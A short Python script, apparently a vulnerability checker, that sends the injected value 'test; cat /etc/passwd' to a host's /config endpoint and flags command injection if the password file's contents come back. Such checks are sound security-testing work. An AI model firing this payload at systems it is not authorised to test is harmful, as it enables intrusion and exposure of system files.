"""
Explain vulnerability
"""

from argparse import ArgumentParser

from requests import RequestException, post


def check_command_injection(ip: str):
    """
    Checks for the command injection vulnerability
    """

    print("# Checking for command injection...")

    payload = "test; cat /etc/passwd"
    try:
        res = post(f"http://{ip}/config", data={"input": payload}, timeout=5)

        if res:
            if "root:x" in res.text:
                print("*Command injection vulnerability found!*")
        else:
            print(
                f"Check for Command injection\nError occured, return status: {res.status_code}"
            )
    except RequestException as e:
        print(f"Check for Command injection\nRequest raised exception: {e}")

    print()


if __name__ == "__main__":
    parser = ArgumentParser(prog="check_command_injection")
    parser.add_argument("-ip", action="store", type=str)
    args = parser.parse_args()
    check_command_injection(args.ip)
